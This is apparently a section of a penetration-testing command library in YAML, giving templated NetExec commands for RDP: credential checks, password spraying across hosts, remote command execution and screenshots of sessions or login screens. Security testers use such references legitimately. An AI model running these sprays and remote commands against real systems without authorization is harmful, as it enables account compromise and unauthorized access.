  # ============================================================================
  # RDP PROTOCOL
  # ============================================================================

  - title: nxc rdp - basic authentication
    desc: |
      Authenticate to RDP service with username and password. Tests RDP
      credentials. Shows (Pwn3d!) when code execution is possible.
    command: "nxc rdp {{target}} -u {{username}} -p {{password}}"

  - title: nxc rdp - password spray
    desc: |
      Password spray against RDP services. Tests credentials against multiple
      RDP hosts. Watch for account lockouts!
    command: "nxc rdp {{target}} -u {{users_file|~/users.txt}} -p {{password|Summer18}}"

  - title: nxc rdp - password spray without bruteforce
    desc: |
      Password spray with 1:1 user:password mapping. Each user gets matched
      with corresponding password from file. user1=>pass1, user2=>pass2.
    command: "nxc rdp {{target}} -u {{users_file|~/users.txt}} -p {{passwords_file|~/passwords.txt}} --no-bruteforce"

  - title: nxc rdp - execute command
    desc: |
      Execute command on remote system via RDP. Runs command through RDP
      session. Shows (Pwn3d!) on success.
    command: "nxc rdp {{target}} -u {{username}} -p {{password}} -x {{command|whoami}}"

  - title: nxc rdp - take screenshot (connected)
    desc: |
      Take screenshot of RDP session when connected. Captures screen of active
      RDP session. Useful for reconnaissance.
    command: "nxc rdp {{target}} -u {{username}} -p {{password}} --screenshot"

  - title: nxc rdp - take screenshot (without NLA, not connected)
    desc: |
      Take screenshot without NLA when not connected. Attempts to capture
      login screen on RDP servers with NLA disabled.
    command: "nxc rdp {{target}} --screenshot-no-nla"

